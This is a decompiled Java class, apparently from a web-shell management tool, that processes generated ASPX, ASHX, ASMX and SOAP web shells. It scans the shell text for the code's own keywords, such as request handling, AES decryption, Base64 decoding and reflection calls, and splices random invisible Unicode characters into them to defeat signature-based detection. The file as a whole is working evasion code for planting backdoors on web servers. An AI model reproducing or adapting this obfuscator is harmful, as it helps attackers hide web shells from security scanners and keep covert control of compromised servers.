//
// Source code recreated from a .class file by IntelliJ IDEA
// (powered by FernFlower decompiler)
//

package core.shellprocessor.aspxJunkCode;

import core.annotation.GenerateProcessor;
import core.imp.ShellProcessor;

@GenerateProcessor(
        DisplayName = "JunkCode",
        superTemplate = {"aspx", "ashx", "asmx", "soap"}
)
public class ASPXJunkCode implements ShellProcessor {
    public ASPXJunkCode() {
    }

    public static String AspxJunkCode(String text) {
        String[] list = new String[]{"BinaryRead", "ContentLength", "Context.Request", "Context.Response", "Context.Session", "BinaryWrite", "ComputeHash", "CreateDecryptor", "CreateEncryptor", "Cryptography", "GetMethod", "MD5CryptoServiceProvider", "RijndaelManaged", "System.BitConverter", "System.Convert", "FromBase64String", "ToBase64String", "System.IO.MemoryStream", "System.Reflection", "Assembly", "System.Security", "System.Text.Encoding.Default.GetBytes", "System.Type", "ToString", "TransformFinalBlock", "magicNum1", "magicNum2", "CreateInstance"};
        String[] junklist = new String[]{"\\u070f", "\\u180b", "\\u180c", "\\u180e", "\\u180d", "\\ufeff"};
        String temp = "";
        String result = text;

        for(int i = 0; i < list.length; ++i) {
            String s = list[i];
            int index = text.indexOf(s);
            if (index != -1) {
                int white = 0;
                char[] chars = s.toCharArray();

                for(int j = 0; j < chars.length; ++j) {
                    String cc = String.valueOf(chars[j]);
                    if (j > white) {
                        white = s.indexOf(".", white + 1);
                    }

                    if (j != white) {
                        int random = (int)(Math.random() * (double)junklist.length);
                        String junk = junklist[random];
                        temp = temp + cc + junk;
                    } else {
                        temp = temp + cc;
                    }
                }

                result = result.replace(s, temp);
                temp = "";
            }
        }

        return result;
    }

    public byte[] doProcessor(byte[] shell, String suffix) {
        String shellContent = new String(shell);
        shellContent = AspxJunkCode(shellContent);
        return shellContent.getBytes();
    }
}
